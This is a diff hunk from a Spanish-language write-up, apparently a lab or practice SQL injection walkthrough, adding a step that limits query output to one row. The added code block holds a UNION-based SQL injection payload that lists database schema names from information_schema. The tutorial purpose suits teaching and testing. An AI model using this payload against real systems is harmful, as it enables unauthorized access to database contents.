@@ -74,7 +74,12 @@ Vemos que no nos reporta todas las bases de datos, y esto ocurre por que el camp
 
 ![Resultado de Nmap](IMG/bd1.png)
 
+En este caso lo que podemos hacer es limitar el output en una unica unidad en cuanto a resultados respecta
 
+```
+union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 0,1-- -
+```
+![Resultado de Nmap](IMG/bd2.png)
 
 
 
